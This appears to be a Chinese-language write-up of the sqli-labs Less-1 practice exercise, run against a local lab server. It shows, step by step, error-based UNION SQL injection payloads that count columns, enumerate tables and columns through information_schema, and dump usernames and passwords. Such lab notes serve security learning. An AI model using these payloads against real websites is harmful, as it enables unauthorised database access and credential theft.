# Less-1

## 0x00 注入

http://192.168.0.105/vulnlab/sqli/Less-1/index.php?id=1

添加一个单引号。

?id=1'

You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''1'' LIMIT 0,1' at line 1

可以看出，参数id在sql语句中被单引号包括。

?id=1' order by 4--+

Unknown column '4' in 'order clause'

?id=1' order by 3--+

正常

使用order by猜测字段数，--+用来注释掉单引号和其他字符。

显然，这里的字段数有3个。

?id=-1' union select 1,2,3--+

![image-20210112164946461](D:\WEB安全\笔记\image\image-20210112164946461.png)

可以看到，显位只有2，3。

?id=-1' union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database()--+

![image-20210112165228215](D:\WEB安全\笔记\image\image-20210112165228215.png)

information_schema 是一个数据库，用来存储数据库信息。

group_concat()函数可以将所有数据打印出来。

不用group_concat()就只能看到一个。

?id=-1' union select 1,group_concat(column_name),3 from information_schema.columns where table_schema=database() and table_name='users'--+

![image-20210112165512418](D:\WEB安全\笔记\image\image-20210112165512418.png)

?id=-1' union select 1, group_concat(username), group_concat(password) from users--+

![image-20210112165611724](D:\WEB安全\笔记\image\image-20210112165611724.png)



## 0x01 分析

报错型注入，参数类型是字符串。